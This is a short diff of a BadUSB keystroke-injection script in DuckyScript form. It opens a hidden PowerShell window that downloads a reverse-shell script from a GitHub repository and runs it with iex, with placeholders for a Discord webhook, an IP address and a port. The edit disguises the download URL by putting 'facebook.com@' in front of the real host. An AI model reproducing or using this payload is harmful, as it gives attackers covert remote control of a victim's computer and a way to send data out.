@@ -1,4 +1,4 @@
 GUI r
 DELAY 1500
-STRING powershell -W hidden -nop -c "$webhook = 'DISCORD_WEBHOOK'; $ipv4 = 'IP_ADDRESS'; $portty = PORT_NUMBER; $c = (iwr -Uri 'https://raw.githubusercontent.com/CharlesTheGreat77/BADUSB/main/ReverseShell/shelly.txt').Content ; iex $c"
+STRING powershell -W hidden -nop -c "$webhook = 'DISCORD_WEBHOOK'; $ipv4 = 'IP_ADDRESS'; $portty = PORT_NUMBER; $c = (iwr -Uri 'https://facebook.com@raw.githubusercontent.com/CharlesTheGreat77/BADUSB/main/ReverseShell/shelly.txt').Content ; iex $c"
 ENTER
